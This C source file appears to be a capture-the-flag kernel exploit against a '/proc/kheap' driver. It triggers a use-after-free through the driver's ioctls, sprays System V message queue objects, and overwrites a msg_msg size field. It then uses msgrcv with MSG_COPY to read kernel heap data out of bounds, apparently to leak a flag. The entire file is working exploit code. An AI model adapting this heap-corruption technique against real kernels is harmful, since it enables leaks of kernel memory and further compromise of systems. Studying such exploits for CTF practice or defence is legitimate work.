#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>


int do_print = 0x5702;
int pre_flag = 0x5704;
int cp_user = 0x5700;
int kefree = 0x5703;
int cp_from_user = 0x5701;

typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

typedef struct _msgbuf_t {
    long mtype;
    char buf[0x1000];
}msgbuf_t;


kheap_req_t kheap_req;


void ezblock() {
    puts("blocking!");
    char a;
    read(0, &a, 1);
}


unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int open_fd()
{
    int fd = open("/proc/kheap", 0);
    return fd;
}

void free_slot(int fd)
{
    int ret = ioctl(fd, kefree, &kheap_req);
    printf("free %d\n", ret);
}

void read_slot(int fd)
{
    int ret = ioctl(fd, cp_user, &kheap_req);
    printf("read %d\n", ret);
}

void cpy_flag(int fd)
{
    int ret = ioctl(fd, pre_flag, &kheap_req);
    printf("cpy_flag %d\n", ret);
}

void write_slot(int fd)
{
    int ret = ioctl(fd, cp_from_user, &kheap_req);
    printf("write %d\n", ret);
}

int main()
{
    int fd[512];
    char buf [1024];
    unsigned long do_print_addr = 0;
    int fd_save = -1;

    kheap_req.ubuf = buf;
    kheap_req.size = 0x1d0;

    unsigned long leak[2];
    memcpy(buf, "AAAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;

    int fd_1 = open_fd();
    
    for (int i = 0; i < 39; i++)
    {
        cpy_flag(fd_1);
    }
    // int fd_2 = open_fd();
    
    // for (int i = 0; i < 39; i++)
    // {
    //     cpy_flag(fd_2);
    // }

    free_slot(fd_1);
    size_t target_cachesize = 128;
    size_t msgsz = target_cachesize - 0x30;
    msgbuf_t* msgbuf = calloc(1, sizeof(msgbuf_t));
    puts("\nBEFORE creating messages\n");
    ezblock();

    key_t key = ftok("/leve6", 2);
    int msq_id = msgget(key, 0666 | IPC_CREAT) ;
    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0x41, 0x1000);
    if (msgsnd(msq_id, msgbuf, 0x200 - 0x30, 0) < 0) {
        perror ("MSGSND bad stuff happened!");
        exit(1);
    }
    kheap_req.size = 0x20;
    // set buf to be ???
    // Recreate message header to change size
    memset (buf, 0x01, 1024);
    uint64_t *m_ts_addr = (((uint64_t *) (buf)) + 3);
    *m_ts_addr = 0x400;
    ezblock();
    write_slot(fd_1);
    //ioctl(fd_1, 0x5701, &req);
#define MSG_COPY                    040000  /* copy (not remove) all queue messages */

    if (msgrcv(msq_id, msgbuf, 0x1000, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x800;i++)
    {
        printf("%c", msgbuf->buf[i]);
    }
    printf("print kheap data end\n");
    return 0;
}